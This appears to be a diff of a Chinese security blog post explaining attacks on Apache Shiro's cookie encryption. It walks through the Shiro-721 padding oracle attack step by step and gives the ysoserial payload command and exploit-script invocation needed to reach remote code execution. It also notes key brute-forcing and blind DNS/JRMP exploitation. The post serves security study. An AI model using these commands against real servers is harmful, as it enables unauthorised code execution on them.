+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>我们举例子密文最后一个字符是90  </p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/24.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>我们举例子，密文最后一个字符是 90：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/25.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p><strong>解密公式：p是填充  I是中间状态   IV是向量</strong></p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/26.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p><strong>解密公式：p 是填充，I 是中间状态，IV 是向量</strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>我们最终是求出新的IV，而不是去改变密文C  要注意：是 利用新的IV让其密文解密后的结果为我们的恶意内容</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/27.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>我们最终是求出新的 IV，而不是去改变密文 C。要注意：是利用新的 IV 让其密文解密后的结果为我们的恶意内容。</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>我们举例子一个字节长度为10的与shiro的cookie同款加密的密文</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/28.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>我们举例子，一个字节长度为 10 的、与 shiro 的 cookie 同款加密的密文：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>我们base64解密是二进制内容  我们转为16进制：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/29.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>我们 base64 解密是二进制内容，我们转为 16 进制：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>正常的cookie是前16字节是IV  后面的为密文C  因为这里是举例子所以就设置如下：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/31.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>正常的 cookie 是前 16 字节为 IV，后面的为密文 C。因为这里是举例子所以就设置如下：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/12.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>第一轮爆破：IV[4]的爆破（保证IV数组其他不变 先改变数组最后一个值这里从0x00开始）  比如第一次失败：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/32.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>第一轮爆破：IV[4] 的爆破（保证 IV 数组其他不变，先改变数组最后一个值，这里从 0x00 开始）。比如第一次失败：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/13.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>爆破ing~     。。。。。一直爆破到第171次：IV的最后一个数组是0XAA</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/33.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>爆破 ing~ …… 一直爆破到第 171 次，IV 的最后一个数组是 0xAA：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/14.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>这个时候 有p[4]也有IV[4]  求出I[4]:</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/34.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>这个时候有 p[4] 也有 IV[4]，求出 I[4]：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/15.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>第二轮：IV[3]的爆破 （开始前要先利用I[4]反推出IV[4]替换一下，然后再去爆破IV[3]）</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/35.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>第二轮：IV[3] 的爆破（开始前要先利用 I[4] 反推出 IV[4] 替换一下，然后再去爆破 IV[3]）：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/16.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>爆破ing~。。。。。。。。 不知道爆破了多少次  爆破出来</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/36.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>爆破 ing~ …… 不知道爆破了多少次，爆破出来：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/17.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>这个时候再反推I[3]：</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/37.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>这个时候再反推 I[3]：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/18.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>就这样一直爆破出整个I的值  然后我们构造一个恶意payload内容是二进制</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/38.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<p>就这样一直爆破出整个 I 的值，然后我们构造一个恶意 payload，内容是二进制：</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/shiro%E7%9A%84%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E5%92%8C%E5%8A%A0%E5%AF%86/19.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
 
-<p>反推出新的IV  然后替换旧的IV  这个时候发包 服务器就会执行我们的内容</p>
-<h4 id="（4）总结"><a href="#（4）总结" class="headerlink" title="（4）总结"></a>（4）总结</h4><p>因为这个AES的密钥不是硬编码  而不是随机的  但是CBC模式 + Padding Oracle。加密模式本身存在设计缺陷，所以导致可以绕过密钥进行攻击</p>
-<h4 id="（5）工具使用"><a href="#（5）工具使用" class="headerlink" title="（5）工具使用"></a>（5）工具使用</h4><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721/blob/master/exp/shiro_exp.py">https://github.com/inspiringz/Shiro-721/blob/master/exp/shiro_exp.py</a></p>
+<p>反推出新的 IV，然后替换旧的 IV，这个时候发包，服务器就会执行我们的内容。</p>
+<h4 id="（4）总结"><a href="#（4）总结" class="headerlink" title="（4）总结"></a>（4）总结</h4><p>因为这个 AES 的密钥不是硬编码而是随机的，但是 CBC 模式 + Padding Oracle，加密模式本身存在设计缺陷，所以导致可以绕过密钥进行攻击。</p>
+<h4 id="（5）工具使用"><a href="#（5）工具使用" class="headerlink" title="（5）工具使用"></a>（5）工具使用</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721/blob/master/exp/shiro_exp.py">https://github.com/inspiringz/Shiro-721/blob/master/exp/shiro_exp.py</a></li>
+</ul>
 <p>构造恶意的二进制内容：</p>
-<p>java-jar ysoserial-all.jar CommonsBeanutils1（链子自己猜测） “命令”&gt; poc.ser</p>
-<p>爆破得到新的符填充的恶意内容的base64（可能时间较长）：</p>
-<p>python2 shiro_exp.py “url” “正常的cookie密文” poc.ser  </p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/images/39.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1（链子自己猜测） &quot;命令&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
 
-<h2 id="类型三：爆破密钥漏洞"><a href="#类型三：爆破密钥漏洞" class="headerlink" title="类型三：爆破密钥漏洞"></a>类型三：爆破密钥漏洞</h2><p><strong>版本：全版本</strong></p>
-<p><strong>条件：密钥在爆破字典中</strong></p>
-<p>原理：在讨论算法中其实很清楚知道，无论AES-CBC还是AES-GCM的加解密算法都是公开已知的。而解密时需要的两个变量IV和Key，解密时服务器是使用Cookie中提取的IV，所以也就只存在一个<strong>变量Key</strong>，所以如果必须幸运的话爆破出密钥，就可以直接构造恶意内容。</p>
-<h2 id="类型四：对于-shiro有密钥但是不回显的形式"><a href="#类型四：对于-shiro有密钥但是不回显的形式" class="headerlink" title="类型四：对于 shiro有密钥但是不回显的形式"></a>类型四：对于 shiro有密钥但是不回显的形式</h2><p>（利用方式 ：DNS  ，JRMPC）</p>
-<p>工具：  <a target="_blank" rel="noopener" href="https://github.com/wyzxxz/shiro_rce_tool">https://github.com/wyzxxz/shiro_rce_tool</a></p>
